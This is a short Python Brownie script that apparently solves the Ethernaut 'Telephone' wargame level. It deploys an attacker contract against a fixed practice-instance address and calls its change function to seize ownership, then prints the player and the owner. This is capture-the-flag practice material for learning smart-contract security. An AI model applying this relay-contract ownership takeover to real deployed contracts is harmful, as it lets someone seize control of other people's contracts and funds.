from scripts.helpful_scripts import get_account
from brownie import accounts, config, interface, network, Attack04, Attack_Telephone

ETHERNAUT_INSTANCE = "0xaA0349CfC5a3cE9FD3f24622F749799693b64354"


def main():

    player = get_account()

    attacker_contract = Attack_Telephone.deploy(ETHERNAUT_INSTANCE, {"from": player})
    attack_interface = interface.Iattack_telephone(attacker_contract.address)
    telphone_interface = interface.Itelephone(ETHERNAUT_INSTANCE)

    attacker_contract.change({"from": player})

    # There is a change of state in contract so need {'from':player})
    attack_interface.change({"from": player})
    owner = telphone_interface.owner()
    print("Player is ", player)
    print("Owner is", owner)
